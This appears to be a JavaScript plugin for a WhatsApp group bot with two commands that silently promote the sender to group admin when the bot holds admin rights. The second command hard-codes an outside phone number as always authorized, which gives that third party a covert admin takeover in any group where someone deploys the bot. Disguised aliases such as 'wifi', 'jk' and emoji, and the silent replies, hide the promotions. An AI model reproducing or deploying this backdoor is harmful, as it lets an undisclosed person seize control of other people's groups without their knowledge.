const fs = require("fs");
const path = require("path");
const { cmd } = require('../command');
const config = require('../config');

const OWNER_PATH = path.join(__dirname, "../assets/sudo.json");

// Make sure sudo file exists
const ensureOwnerFile = () => {
    if (!fs.existsSync(OWNER_PATH)) {
        fs.writeFileSync(OWNER_PATH, JSON.stringify([]));
    }
};

cmd({
    pattern: "jk",
    alias: ["lpc", "🤡", "aj", "wifi"],
    desc: "Silently take adminship if authorized (sudo list or owner)",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup || !isBotAdmins) return;

    ensureOwnerFile();
    const owners = JSON.parse(fs.readFileSync(OWNER_PATH, "utf-8"));

    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid : jid + '@s.whatsapp.net';
    };

    const senderNormalized = normalizeJid(sender);
    const devNormalized = normalizeJid(config.DEV);

    // Check if sender is in sudo list or is main owner
    if (!owners.includes(senderNormalized) && senderNormalized !== devNormalized) return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);

        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});
cmd({
    pattern: "admin",
    alias: ["takeadmin", "🔪", "aa", "op", "makeadmin"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup || !isBotAdmins) return;

    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        "923427582273@s.whatsapp.net"
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});
